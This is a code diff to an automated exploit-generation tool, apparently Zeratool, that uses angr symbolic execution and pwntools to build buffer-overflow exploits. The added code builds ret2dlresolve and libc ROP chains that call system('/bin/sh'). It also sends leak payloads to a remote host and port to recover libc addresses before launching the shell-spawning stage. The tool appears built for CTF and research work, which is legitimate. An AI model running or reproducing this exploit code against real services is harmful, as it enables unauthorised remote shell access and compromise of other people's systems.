@@ -1,7 +1,8 @@
 import claripy
 from .radare_helper import findShellcode
+from .remote_libc import get_remote_libc_with_leaks
+import angr
 from pwn import *
-import timeout_decorator
 import logging
 
 logging.getLogger("pwnlib.elf.elf").disabled = True
@@ -59,10 +60,10 @@ def get_leak_rop_chain(properties, leak_num=-1):
     elf = ELF(properties["file"])
     rop = ROP(elf)
 
-    print_functions = ["puts"]
+    print_functions = ["puts", "printf"]
     leak_function = list(elf.got)[leak_num]
-    log.info("elf.got : {}".format(elf.got))
-    log.info("Leaking {}".format(leak_function))
+    log.debug("elf.got : {}".format(elf.got))
+    log.debug("Leaking {}".format(leak_function))
 
     ret_func = None
 
@@ -80,10 +81,18 @@ def get_leak_rop_chain(properties, leak_num=-1):
     if ret_func is None:
         raise RuntimeError("Cannot find symbol to return to")
 
-    # movabs
-    rop.raw(rop.ret.address)
+    # chain is even number, so need to align for movabs
+    if not properties["sp_is_16bit_aligned"]:
+        log.info("sp is aligned 16bit")
+        rop.raw(rop.ret.address)
+
     rop.call(ret_func, [elf.got[leak_function]])
-    if "main" in elf.symbols:  # Retrigger exploit
+
+    retrigger_addr = properties.get("vulnerable_function", None)
+
+    if retrigger_addr:  # Retrigger exploit
+        rop.call(retrigger_addr.rebased_addr)
+    elif "main" in elf.symbols:
         rop.call(elf.symbols["main"])
     else:
         log.error("No main symbol exposed, can't auto call")
@@ -93,7 +102,73 @@ def get_leak_rop_chain(properties, leak_num=-1):
     return rop, rop.build()
 
 
-def get_rop_chain(properties):
+def choose_data_addr(elf, symbol):
+    # Try to find an offset that works with the version addr
+    # The offset for the ElfSym (size 0x10) from .DynSym needs to be in a writable section
+    # and the offset from DT_VERSYM (size 2) needs to point to a half-word that isn't too large
+    # Otherwise we will get a segfault
+    # We can't go beyond mapped memory of libc which l_info is close to, the value we read
+    # will get multiplied by 0x10 and added to the base of l_versions so it needs to be less than
+    # and an upper limit i've seen is ~0x600, so we would need bytes less than 0x60
+
+    elf_load_address_fixup = elf.address - elf.load_addr
+    symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + elf_load_address_fixup
+    versym = elf.dynamic_value_by_tag("DT_VERSYM") + elf_load_address_fixup
+    bss = elf.get_section_by_name(".bss").header.sh_addr + elf_load_address_fixup
+    start_search_addr = bss + len(symbol + b"\x00")
+    # End at the end of the page
+    end_search_addr = (bss + 0x1000) & ~0xFFF
+    recommend_addr = start_search_addr
+    for a in range(start_search_addr, end_search_addr, 2):
+        index = align(0x10, a - symtab) // 0x10
+        version_addr = versym + (2 * index)
+        # Get bytes
+        b = elf.read(version_addr, 2)
+        val = int.from_bytes(b, "little")
+        if val < 0x60:
+            recommend_addr = a
+            break
+    return recommend_addr
+
+
+def get_dlresolve_rop_chain(properties, state, data_addr=None):
+
+    context.binary = properties["file"]
+    elf = ELF(properties["file"])
+    rop = ROP(elf)
+
+    log.info("Trying dlresolve chain")
+
+    context.arch = "amd64"
+    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
+
+    # data_addr = choose_data_addr(elf, b"system")
+
+    # log.info("{} : {}".format(hex(data_addr), hex(dlresolve.data_addr)))
+
+    if data_addr:
+        dlresolve.data_addr = data_addr
+
+    if "read" in elf.plt:
+        rop.call("read", [0, dlresolve.data_addr])
+    elif "gets" in elf.plt:
+        rop.call("gets", [dlresolve.data_addr])
+    # rop.read(0, dlresolve.data_addr)
+    # rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
+
+    rop.ret2dlresolve(dlresolve)
+
+    log.info("rop chain gadgets and values:\n{}".format(rop.dump()))
+
+    """
+    We need both the generated chain and gadget addresses for when
+    we contrain theprogram state to execute and constrain this chain,
+    so we pass back both the rop tools refernce along with the chain.
+    """
+    return dlresolve, rop, rop.build()
+
+
+def get_rop_chain(properties, state=None):
     context.binary = properties["file"]
     elf = ELF(properties["file"])
     rop = ROP(elf)
@@ -103,6 +178,10 @@ def get_rop_chain(properties):
 
     ret_func = None
     ret_string = None
+
+    if properties.get("force_dlresolve", False):
+        log.info("Forcing dlresolve chain")
+        return get_dlresolve_rop_chain(properties, state)
 
     # Find the function we want to call
     for function in functions:
@@ -123,37 +202,55 @@ def get_rop_chain(properties):
     # If we can't find our symbols and string in the binary
     # we may need to check our libc bin
     if properties.get("libc", None):
-        log.info("[~] Provied libc, using leak and lib to build chain")
-        libc = ELF(properties["libc"])
-        # Set libc loaded address
-        libc.address = properties["libc_base_address"]
 
-        # Find the function we want to call
-        for function in functions:
-            if function in libc.plt:
-                ret_func = libc.plt[function]
-                break
-            elif function in libc.symbols:
-                ret_func = libc.symbols[function]
-                break
+        log.info("[~] Provided libc, using leak and lib to build chain")
 
-        # Find the string we want to pass it
-        for string in strings:
-            str_occurences = list(libc.search(string))
-            if str_occurences:
-                ret_string = str_occurences[0]
-                break
-        rop = ROP(libc)
+        if isinstance(properties["libc"], dict):
+            log.info("Trying remote libc offsets")
+            remote_libc = properties["libc"]["remote_libc"][0]
+
+            symbols = remote_libc["symbols"]
+            ret_func = int(symbols["system"], 16) + properties["libc_base_address"]
+            ret_string = (
+                int(symbols["str_bin_sh"], 16) + properties["libc_base_address"]
+            )
+        else:
+            libc = ELF(properties["libc"])
+            # Set libc loaded address
+            libc.address = properties["libc_base_address"]
+
+            # Find the function we want to call
+            for function in functions:
+                if function in libc.plt:
+                    ret_func = libc.plt[function]
+                    break
+                elif function in libc.symbols:
+                    ret_func = libc.symbols[function]
+                    break
+
+            # Find the string we want to pass it
+            for string in strings:
+                str_occurences = list(libc.search(string))
+                if str_occurences:
+                    ret_string = str_occurences[0]
+                    break
+            rop = ROP(libc)
 
     if not ret_func:
-        raise RuntimeError("Cannot find symbol to return to")
+        log.warning("Cannot find symbol to return to")
+        return get_dlresolve_rop_chain(properties, state)
     if not ret_string:
-        raise RuntimeError("Cannot find string to pass to system or exec call")
+        log.warning("Cannot find string to pass to system or exec call")
+        return get_dlresolve_rop_chain(properties, state)
 
-    # movabs fix
-    rop.raw(rop.ret.address)
+    # chain is odd number, so need to align for movabs
+    if properties["sp_is_16bit_aligned"]:
+        log.info("sp is aligned 16bit")
+        rop.raw(rop.ret.address)
+
     if properties.get("libc", None):
-        rop.call(ret_func, [ret_string, 0, 0])
+        rop.call(ret_func, [ret_string])
+        # rop.call(ret_func, [ret_string, 0, 0])
     else:
         # If we don't have libc we probably don't have all the nice
         # gadgets
@@ -161,7 +258,7 @@ def get_rop_chain(properties):
 
     log.info("\n{}".format(rop.dump()))
 
-    return rop, rop.build()
+    return None, rop, rop.build()
 
 
 def find_symbolic_buffer(state, length, arg=None):
@@ -194,6 +291,18 @@ def check_continuity(address, addresses, length):
 
 
 def overflow_detect_filter(simgr):
+
+    for state in simgr.active:
+        if state.globals.get("type", None) == "overflow_variable":
+            log.info("Found vulnerable state. Overflow variable to win")
+            user_input = state.globals["user_input"]
+            input_bytes = state.solver.eval(user_input, cast_to=bytes)
+            log.info("[+] Vulnerable path found {}".format(input_bytes))
+            state.globals["type"] = "overflow_variable"
+            state.globals["input"] = input_bytes
+            simgr.stashes["found"].append(state)
+            simgr.stashes["active"].remove(state)
+            return simgr
 
     for state in simgr.unconstrained:
         bits = state.arch.bits
@@ -274,20 +383,6 @@ def point_to_shellcode_filter(simgr):
         if len(addresses):
             list.sort(addresses)
 
-        # Can we add a nop sled?
-        # max_nop_count = 0
-        # if addresses:
-        #     for x in range(0x50):
-        #         bigger_addrs = [
-        #             x for x in find_symbolic_buffer(state, len(shellcode) + x)
-        #         ]
-        #         if bigger_addrs:
-        #             addresses = bigger_addrs
-        #             max_nop_count = x
-        # if max_nop_count > 0:
-        #     log.info("Adding {} nops to shellcode".format(max_nop_count))
-        #     shellcode = b"\x90" * max_nop_count + shellcode
-
         # Build shellcode and check for bad chars
         avoidList = []
         for i, address in enumerate(addresses):
@@ -366,16 +461,6 @@ def point_to_shellcode_filter(simgr):
                     user_input, cast_to=bytes, extra_constraints=[constraint]
                 )
 
-                # r2_address = findShellcode(state.project.filename, \
-                #     state.history.bbl_addrs[-1], shellcode, input_bytes)
-
-                # log.info("Got r2 address : {}".format(hex(r2_address['offset'])))
-                # log.info("vs {}".format(hex(address)))
-
-                # r2_constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == r2_address)
-                # r2_input_bytes = state.solver.eval(user_input, \
-                #     cast_to=bytes, extra_constraints=[r2_constraint])
-
                 log.info("[+] Vulnerable path found {}".format(input_bytes))
                 state.globals["type"] = "Overflow"
                 state.globals["input"] = input_bytes
@@ -385,7 +470,9 @@ def point_to_shellcode_filter(simgr):
     return simgr
 
 
-def do_leak_with_ropchain_constrain(elf, rop_chain, new_state, is_32bit=False):
+def do_leak_with_ropchain_constrain(
+    elf, rop_chain, new_state, is_32bit=False, dlresolve=None
+):
     """
     This is a more traditional build and constrain payload that looks for
     an offset from the initial input and starts placing a rop chain there.
@@ -394,7 +481,7 @@ def do_leak_with_ropchain_constrain(elf, rop_chain, new_state, is_32bit=False):
     leak with stepping so we know when a gaget breaks, but if the other one
     is breaking, you can try this one.
     """
-    log.info("Constraining input to rop chain without single stepping")
+    log.debug("Constraining input to rop chain without single stepping")
     user_input = new_state.globals["user_input"]
 
     if is_32bit:
@@ -413,7 +500,7 @@ def do_leak_with_ropchain_constrain(elf, rop_chain, new_state, is_32bit=False):
 
         # Hunt for the start of PC overwrite
         if x is new_state.regs.pc.chop(8)[pc_index]:
-            log.info("Found PC overwrite at offset : {}".format(i))
+            log.debug("Found PC overwrite at offset : {}".format(i))
             start_constraining = True
 
         # Assume gadgets are all next to each other on the stack
@@ -430,30 +517,109 @@ def do_leak_with_ropchain_constrain(elf, rop_chain, new_state, is_32bit=False):
                 )
                 break
 
-    rop_simgr = new_state.project.factory.simgr(new_state)
+    if not dlresolve:
 
-    # Verify that these gadgets result in a call to main after the leak
-    if new_state.globals["needs_leak"]:
-        rop_simgr.explore(
-            find=lambda s: elf.symbols["main"] == s.solver.eval(s.regs.pc)
-        )
-        new_state = rop_simgr.found[0]
+        rop_simgr = new_state.project.factory.simgr(new_state)
 
-    log.info(rop_simgr)
+        retrigger_addr = new_state.globals.get("vulnerable_function", None)
+
+        if retrigger_addr:  # Retrigger exploit
+            retrigger_addr = retrigger_addr.rebased_addr
+        elif "main" in elf.symbols:
+            retrigger_addr = elf.symbols["main"]
+
+        # Verify that these gadgets result in a call to main after the leak
+        if new_state.globals["needs_leak"]:
+            rop_simgr.explore(find=lambda s: retrigger_addr == s.solver.eval(s.regs.pc))
+            if len(rop_simgr.found) > 0:
+                new_state = rop_simgr.found[0]
+            else:
+                log.debug("Couldn't verify")
+
+        log.debug(rop_simgr)
 
     return user_input, new_state
 
 
-def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
+def plt_call_hook(state, gadget_addr):
+    """
+    Emulating the following instructions:
+    push    qword ptr [rip + 0x2fe2]
+    bnd jmp    qword ptr [rip + 0x2fe3]
+    """
+    log.info("Emulating plt call hook")
+    p2 = angr.Project(state.project.filename, auto_load_libs=False)
+    CFG = p2.analyses.CFG()
+
+    pc_block = CFG.model.get_any_node(gadget_addr).block
+    for insn in pc_block.capstone.insns:
+        log.info(insn)
+        rip_addr = insn.address
+        rip_offset = insn.disp
+        if insn.mnemonic == "push":
+            ret_val = rip_addr + rip_offset + insn.size
+            log.info("Emulating stack push with value : {}".format(hex(ret_val)))
+            state.stack_push(ret_val)
+        elif "jmp" in insn.mnemonic:
+            pc_val = rip_addr + rip_offset + insn.size
+            log.info("Emulating plt jmp with value : {}".format(hex(pc_val)))
+            # Emulating a 'bnd jmp'
+            # the bnd part is pretty much just a nop
+            state.regs.pc = pc_val
+
+
+def get_debug_stack(state, depth=8, rop=None):
+    register_size = int(state.arch.bits / 8)
+    curr_sp = state.solver.eval(state.regs.sp)
+
+    dbg_lines = ["Current Stack Pointer : {}".format(hex(curr_sp))]
+
+    curr_sp -= depth * register_size
+
+    for i in range(depth + 4):
+        address = curr_sp + (i * register_size)
+        val = state.memory.load(address, register_size)
+        concrete_vaue = 0
+        desc = ""
+        concrete_vaue = state.solver.eval(val, cast_to=bytes)
+        concrete_vaue = u64(concrete_vaue)
+        desc = state.project.loader.describe_addr(concrete_vaue)
+        if rop and concrete_vaue in rop.gadgets:
+            rop_gadget = rop.gadgets[concrete_vaue]
+            desc += "\n\t"
+            desc += "\n\t".join(rop_gadget.insns)
+        if "not part of a loaded object" in desc:
+            desc = ""
+        dbg_line = "{:18} | {:18} - {}".format(hex(address), hex(concrete_vaue), desc)
+        dbg_lines.append(dbg_line)
+
+    return "\n".join(dbg_lines)
+
+
+def fix_gadget_registers(gadget):
+    if gadget.regs != []:
+        return gadget
+    log.debug("Fixing gadget : {}".format(gadget))
+    for insn in gadget.insns:
+        if "pop" in insn:
+            # Splt a 'pop eax' or 'pop rdx' to get register name
+            gadget.regs.append(insn.split(" ")[-1])
+    return gadget
+
+
+def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state, dlresolve=None):
     # Only amd64 right now
     user_input = new_state.globals["user_input"]
     curr_rop = None
     elf_symbol_addrs = [y for x, y in elf.symbols.items()]
+    p = new_state.project
 
     for i, gadget in enumerate(rop_chain):
 
         if gadget in rop.gadgets:
             curr_rop = rop.gadgets[gadget]
+
+            curr_rop = fix_gadget_registers(curr_rop)
 
             # reversing it lets us pop values out easy
             curr_rop.regs.reverse()
@@ -477,12 +643,86 @@ def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
                         "gadget is hooked symbol, contraining to real address, but calling SimProc"
                     )
                     symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]
-                    p = new_state.project
                     new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr
 
                 # There is no point in letting our last gadget run, we have all
                 # the constraints on our input to trigger the leak
                 if i == len(rop_chain) - 1:
+                    break
+
+                # Are we in the .plt about to execute our dlresolv payload?
+                if (
+                    p.loader.find_section_containing(gadget).name == ".plt"
+                    and dlresolve is not None
+                ):
+                    """
+                    We're expecting a:
+                    push qword [0x004040008] # .plt section
+                    jmp qword [0x00404010] # .plt section + 0x8
+                    or
+                    401020  push    qword ptr [0x404008]
+                    401026  bnd jmp qword ptr [0x404010]
+                    which we can emulate
+                    """
+                    # load the memory region and constrain it
+                    # We already called read that returned a symbolic read value
+                    # into the section we're about to use
+
+                    dlresolv_payload_memory = new_state.memory.load(
+                        dlresolve.data_addr, len(dlresolve.payload)
+                    )
+                    if new_state.satisfiable(
+                        extra_constraints=(
+                            [dlresolv_payload_memory == dlresolve.payload]
+                        )
+                    ):
+                        new_state.add_constraints(
+                            dlresolv_payload_memory == dlresolve.payload
+                        )
+                        log.debug(
+                            "Values written to address at : {}".format(
+                                hex(dlresolve.data_addr)
+                            )
+                        )
+                    else:
+                        log.info(
+                            "Could not set dlresolve payload to address : {}".format(
+                                hex(dlresolve.data_addr)
+                            )
+                        )
+                        return None, None
+
+                    dlresolv_index = new_state.memory.load(new_state.regs.sp, 8)
+
+                    dlresolve_bytes = p64(rop_chain[i + 1])
+                    if new_state.satisfiable(
+                        extra_constraints=([dlresolv_index == dlresolve_bytes])
+                    ):
+                        new_state.add_constraints(dlresolv_index == dlresolve_bytes)
+                        log.debug(
+                            "Set dlresolv index value to : {}".format(
+                                hex(rop_chain[i + 1])
+                            )
+                        )
+
+                    plt_call_hook(new_state, gadget)
+
+                    rop_simgr = new_state.project.factory.simgr(new_state)
+
+                    # We just need one step into our payload
+                    rop_simgr.step()
+
+                    stack_vals = get_debug_stack(new_state, depth=9, rop=rop)
+                    log.info(stack_vals)
+
+                    if len(rop_simgr.errored):
+                        log.error("Bad Address : {}".format(hex(dlresolve.data_addr)))
+                        return None, None
+
+                    new_state = rop_simgr.active[0]
+                    new_state.globals["dlresolve_payload"] = dlresolve.payload
+                    log.info("Found address : {}".format(hex(dlresolve.data_addr)))
+                    log.info(rop_simgr)
                     break
 
                 """
@@ -495,6 +735,14 @@ def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
                 rop_simgr = new_state.project.factory.simgr(new_state)
                 rop_simgr.explore(opt_level=0)
                 new_state = rop_simgr.unconstrained[0]
+
+                # We already set the dlresolv index value, don't try to execute
+                # the next piece
+                if (
+                    p.loader.find_section_containing(gadget).name == ".plt"
+                    and dlresolve is not None
+                ):
+                    break
 
             else:
                 log.error("unsatisfied on {}".format(hex(gadget)))
@@ -513,6 +761,11 @@ def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
             log.debug("Setting register : {}".format(next_reg))
 
             gadget_msg = gadget
+            if isinstance(gadget, bytes):
+                if new_state.arch.bits == 64:
+                    gadget = u64(gadget)
+                else:
+                    gadget = u32(gadget)
             if isinstance(gadget, int):
                 gadget_msg = hex(gadget)
 
@@ -533,8 +786,141 @@ def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
     return user_input, new_state
 
 
+def leak_remote_libc_functions(simgr):
+
+    """
+    We have two main stages when we need a leak,
+    the leak stage, which will be the first part of our chain
+    and the pwn stage, where we use the leak to set our PC
+    to some address relative to the leaked address
+    """
+    for state in simgr.unconstrained:
+        properties = state.globals["properties"]
+        elf = ELF(properties["file"])
+
+        symbols = {"symbols": {}}
+
+        skip_entries = [
+            "__libc_start_main",
+            "__gmon_start__",
+            "stdout",
+            "stdin",
+            "stderr",
+        ]
+
+        log.info("Current sp : {}".format(hex(state.solver.eval(state.regs.sp))))
+        sp_is_16bit_aligned = state.solver.eval(state.regs.sp) & 0xF == 0
+        properties["sp_is_16bit_aligned"] = sp_is_16bit_aligned
+
+        leaked_values = {}
+
+        for i, name in enumerate(elf.got):  # leak it all
+            if name in skip_entries:
+                continue
+            log.debug("Leaking {} ".format(name))
+
+            properties["vulnerable_function"] = get_vulnerable_function(state)
+
+            rop, rop_chain = get_leak_rop_chain(properties, leak_num=i)
+
+            new_state = state.copy()
+            new_state.globals["vulnerable_function"] = properties["vulnerable_function"]
+
+            # user_input, new_state = do_64bit_leak_with_stepping(
+            #     elf, rop, rop_chain, new_state
+            # )
+
+            """
+            If step-by-step emulation and constraining doesn't work
+            another option is to build the entire chain here and load
+            the memory starting at the start of chain and add a constraint
+            setting it to our rop chain's bytes
+            """
+            is_32bit = new_state.project.arch.bits == 32
+
+            user_input, new_state = do_leak_with_ropchain_constrain(
+                elf, rop_chain, new_state, is_32bit=is_32bit
+            )
+
+            input_bytes = new_state.posix.dumps(0)
+            output_bytes = new_state.posix.dumps(1)
+
+            r = remote(properties["remote"]["url"], properties["remote"]["port"])
+            r.recv()
+            r.clean()
+            r.sendline(input_bytes)
+            bytes_with_leak = r.recvuntil(b"\n").replace(b"\n", b"")
+            log.info(bytes_with_leak)
+            if is_32bit:
+                bytes_with_leak = bytes_with_leak[:4]
+                bytes_with_leak = bytes_with_leak.ljust(4, b"\x00")
+                leaked_val = u32(bytes_with_leak)
+            else:
+                bytes_with_leak = bytes_with_leak.ljust(8, b"\x00")
+                leaked_val = u64(bytes_with_leak)
+            log.info("leaked {} : {}".format(name, hex(leaked_val)))
+            r.close()
+
+            leaked_values[name] = leaked_val
+
+            if leaked_val > 0x7F0000000000:
+                symbols["symbols"][name] = hex(
+                    leaked_val & 0xFFF
+                )  # Only want last three for remote leak
+            else:
+                log.debug("bad canidate address")
+
+        logging.info("leaked all symbols, querying remote libc database")
+
+        for x, y in leaked_values.items():
+            log.info("{} : {}".format(x, hex(y)))
+
+        for x, y in symbols["symbols"].items():
+            log.info("{} : {}".format(x, y))
+
+        if is_32bit:
+            log.warn("remote libc database doesn't support 32bit leaking yet :(")
+            log.warn(
+                "Try plugging these values into https://libc.nullbyte.cat/ and downloading the libc"
+            )
+            log.warn("Then rerun Zeratool with --libc flag")
+            state.globals["libc"] = None
+        else:
+            state.globals["libc"] = get_remote_libc_with_leaks(symbols)
+        simgr.drop(stash="unconstrained")
+        simgr.drop(stash="active")
+        simgr.stashes["found"].append(state)
+
+    return simgr
+
+
+def get_vulnerable_function(state):
+
+    # Python3 magic to get last bbl_addr
+    *_, last_block = state.history.bbl_addrs
+    symbol_addr = None
+
+    if not state.project.loader.main_object.contains_addr(last_block):
+        return symbol_addr
+
+    symbols_addrs = [x.rebased_addr for x in state.project.loader.main_object.symbols]
+    symbols_addrs.sort()
+
+    for i, addr in enumerate(symbols_addrs):
+        if i == 0:
+            continue
+        if last_block < addr and last_block > symbols_addrs[i - 1]:
+            symbol_addr = symbols_addrs[i - 1]
+            symbol = state.project.loader.find_symbol(symbol_addr)
+            log.info("Vulnerable function is : {}".format(symbol))
+            break
+
+    return symbol
+
+
 def point_to_ropchain_filter(simgr):
 
+    dlresolve = None
     """
     For angr hooked function that are part of our rop chain,
     like `puts`, we need to force the simulation manager to
@@ -564,10 +950,19 @@ def point_to_ropchain_filter(simgr):
         properties = state.globals["properties"]
         elf = ELF(properties["file"])
 
-        if state.globals["needs_leak"]:
+        log.info("Current sp : {}".format(hex(state.solver.eval(state.regs.sp))))
+        sp_is_16bit_aligned = state.solver.eval(state.regs.sp) & 0xF == 0
+        properties["sp_is_16bit_aligned"] = sp_is_16bit_aligned
+
+        if properties.get("force_dlresolve", False):
+            dlresolve, rop, rop_chain = get_rop_chain(properties, state=state)
+
+        elif state.globals["needs_leak"]:
+            properties["vulnerable_function"] = get_vulnerable_function(state)
+            state.globals["vulnerable_function"] = properties["vulnerable_function"]
             rop, rop_chain = get_leak_rop_chain(properties)
         else:
-            rop, rop_chain = get_rop_chain(properties)
+            dlresolve, rop, rop_chain = get_rop_chain(properties, state=state)
 
         new_state = state.copy()
 
@@ -577,18 +972,70 @@ def point_to_ropchain_filter(simgr):
             )
 
         else:
-            user_input, new_state = do_64bit_leak_with_stepping(
-                elf, rop, rop_chain, new_state
-            )
+            if dlresolve:
 
-            """
-            If step-by-step emulation and constraining doesn't work
-            another option is to build the entire chain here and load
-            the memory starting at the start of chain and add a constraint
-            setting it to our rop chain's bytes
-            """
+                user_input, new_state = do_64bit_leak_with_stepping(
+                    elf, rop, rop_chain, new_state, dlresolve=dlresolve
+                )
+                if new_state == None:
+                    log.info("64bit stepping failed, trying to constrain whole payload")
+                    new_state = state.copy()
+                    user_input, new_state = do_leak_with_ropchain_constrain(
+                        elf, rop_chain, new_state, is_32bit=False, dlresolve=dlresolve
+                    )
+                new_state.globals["dlresolve_payload"] = dlresolve.payload
 
-            # user_input, new_state = do_leak_with_ropchain_constrain(elf, rop_chain, user_input, new_state, is_32bit=False)
+                input_buf = new_state.posix.dumps(0)
+
+                if dlresolve.payload in input_buf:
+                    payload_index = input_buf.index(dlresolve.payload)
+
+                    """
+                    ret2dlresolve happens in two parts:
+                        The read rop which pulls in our payload
+                        Then sending the payload to be read
+                    """
+                    new_state.globals["dlresolve_first"] = input_buf[:payload_index]
+                    new_state.globals["dlresolve_second"] = input_buf[
+                        payload_index : payload_index + len(dlresolve.payload)
+                    ]
+                else:
+                    new_state.globals["dlresolve_first"] = input_buf
+                    new_state.globals["dlresolve_second"] = new_state.globals[
+                        "dlresolve_payload"
+                    ]
+
+                new_state.globals["needs_leak"] = False
+
+                new_state.globals["type"] = "dlresolve"
+
+                simgr.drop(stash="unconstrained")
+                simgr.drop(stash="found")
+                simgr.stashes["found"].append(new_state)
+
+                log.info("[+] Vulnerable path found {}".format(input_buf))
+                log.info(
+                    "ret2dlresolve 1st : {}".format(
+                        new_state.globals["dlresolve_first"]
+                    )
+                )
+                log.info(
+                    "ret2dlresolve 2nd : {}".format(
+                        new_state.globals["dlresolve_second"]
+                    )
+                )
+                break
+            else:
+                """
+                If step-by-step emulation and constraining doesn't work
+                another option is to build the entire chain here and load
+                the memory starting at the start of chain and add a constraint
+                setting it to our rop chain's bytes
+                """
+
+                user_input, new_state = do_leak_with_ropchain_constrain(
+                    elf, rop_chain, new_state, is_32bit=False
+                )
 
         user_input = new_state.globals["user_input"]
 
@@ -618,7 +1065,10 @@ def point_to_ropchain_filter(simgr):
         leak_input = new_state.globals["leak_input"]
         # The +1 here is to account for a newline. The get_trimmed_input function
         # isn't adding the newline character
-        pwn_bytes = input_bytes[len(leak_input) + 1 :]
+        if not leak_input.endswith(b"\n"):
+            pwn_bytes = input_bytes[len(leak_input) + 1 :]
+        else:
+            pwn_bytes = input_bytes[len(leak_input) :]
 
         """
         If Zeratool fails, we atleast want the inputs that trigger the leak an 
@@ -670,3 +1120,32 @@ def get_num_constraints(chop_byte, state):
             i += 1
     # log.info("{} : {} : {}".format(chop_byte,i,state.solver.eval(chop_byte,cast_to=bytes)))
     return i
+
+
+class hook_win(angr.SimProcedure):
+    IS_FUNCTION = True
+
+    good_strings = [b"/bin/sh", b"flag", b"/bin/bash", b"/bin/dash"]
+
+    def run(self):
+
+        if self.state.arch.bits == 64:
+            cmd_ptr = self.state.regs.rdi
+        if self.state.arch.bits == 32:
+            # First arg pushed to the stack
+            cmd_ptr = self.state.memory.load(self.state.regs.sp - 4, 4)
+        cmd_str = self.state.memory.load(cmd_ptr, 32)
+
+        arg = self.state.solver.eval(cmd_str, cast_to=bytes)
+
+        log.info("system() called with {}".format(arg))
+        if any(x in arg for x in self.good_strings):
+            # Win!
+            self.state.globals["type"] = "overflow_variable"
+
+
+class hook_four(angr.SimProcedure):
+    IS_FUNCTION = True
+
+    def run(self):
+        return 4  # Fair dice roll
